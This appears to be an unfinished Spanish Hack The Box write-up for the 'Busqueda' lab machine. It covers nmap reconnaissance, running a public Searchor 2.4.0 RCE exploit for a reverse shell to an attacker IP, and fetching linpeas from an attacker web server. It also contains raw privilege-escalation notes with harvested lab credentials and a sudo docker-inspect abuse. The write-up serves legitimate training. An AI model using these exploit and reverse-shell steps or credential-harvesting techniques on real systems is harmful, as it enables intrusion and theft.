---
title: Writeup busqueda - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - busqueda
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina busqueda en Hack The Box.
keywords:
  - writeup busqueda
  - hack the box busqueda
  - resolución máquina busqueda
  - busqueda hack the box
  - htb busqueda
---
------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Busqueda)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=QMIQ5e4sjVQ)|[Parte2](https://www.youtube.com/watch?v=DztFFuapoDU)
- 🧠 **Explicación resumida**: 

# TODAVIA NO TERMINAMOS LA MAQUINA

---

#nmap #ping #easy #linux #startlab #/etc/hosts #whatweb #wappalyzer #searchor240 #git #gitclone #nc-nlvp443 #tratamientotty #cd

----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

Se puede utilizar la version automatizada que tenemos creada con [[startlab]] o si no de forma manual con los siguientes comandos

```shell
ping -c 1 IP
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn IP -oG allPortsTCP
extractPorts allPortsTCP
nmap -sCV -pPuertos IP -oN targetTCP
nmap -sU -n -Pn --top-ports 200 IP -oG allPortsUDP
extractPorts allPortsUDP
nmap -sU -sCV -pPuertos IP -oN targetUDP
```

*TTL:* Maquina Linux

*Puertos  TCP:*
	`22` [[ssh]]
	`80` HTTP
	
*Puertos UDP:*
	Solamente esta abierto el 68 de dhcpc y no nos sirve

![[Busqueda6.png]]
![[Busqueda7.png]]
![[Busqueda8.png]]

------
# Agregamos dominio al /etc/hosts

Vemos que la pagina nos envia a searcher.htb asi que lo vamos a cargar en el /etc/hosts
![[Busqueda1.png]]![[Busqueda2.png]]
```
10.129.88.165 searcher.htb
```

![[Busqueda4.png]]

Y listo ahora si nos carga la pagina

![[Busqueda5.png]]

------
# [[Whatweb-wappalyzer]]

```shell
whatweb http://searcher.htb/
```

![[Busqueda9.png]]
![[Busqueda10.png]]
Ninguna informacion relevante


-------
# Intrusion a la maquina por [[searchor 2.4.0]]

Vemos al final de la pagina que esta corriendo searchor 2.4.0
![[Busqueda13.png]]

Asi que con [[git clone]] vamos a usar ``git clone https://github.com/twisted007/Searchor_2.4.0_RCE_Python`` para descargar el repositorio, luego con [[cd]] usamos `cd Searchor_2.4.0_RCE_Python` para entrar a la carpeta y ejecutamos el exploit `python3 searchor-2_4_0_RCE.py searcher.htb 10.10.16.84 443`
En los parametros vamos a colocar la pagina web victima y luego la ip/puerto donde vamos a estar en escucha con [[nc -nlvp 443]] para recibir la [[Reverse shell]]



![[Busqueda14.png]]

![[Busqueda15.png]]
Ya estamos dentro de la maquina victima como el usuario *svc*

-----
# [[Tratamiento de la TTY]]

--------
# Escalada de privilegios





Ubuntu 22.04.2 LTS
5.15.0-69-generic      kernel

 python3 -m http.server 80
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

wget http://10.10.16.84/linpeas.sh -outfile linpeas.sh
chmod +x linpeas.sh
![[Busqueda16.png]]



![[Busqueda17.png]]
http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git


![[Busqueda18.png]]
http://gitea.searcher.htb/cody/Searcher_site.git


![[Busqueda19.png]]


![[Busqueda20.png]]

csrfToken: 'up9irDbVMjy3b6FOb8NRGUzKVDU6MTc2MDQ1NjcwNTU3NTY5NTMwNA',


![[Busqueda22.png]]

![[Busqueda21.png]]

con las credenciales 
cody:jh1usoih2bkjaspwe92 que ganamos antes nos logeamoas

searchsploit gitea
![[Busqueda23.png]]
searchsploit -m multiple/webapps/49571.py

reutilizamos contraseñas y vemos que jh1usoih2bkjaspwe92 es la svc 

![[Busqueda24.png]]

sudo -l

https://docs.docker.com/engine/cli/formatting/
https://docs.docker.com/reference/cli/docker/container/inspect/
que adentro de la carpeta optscripts si corre el full-fheck pero afuera no, creo que es como un path hihacjking pero con scripts

sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect ls --format='{{json .}}' mysql_db


Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF"
MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh"+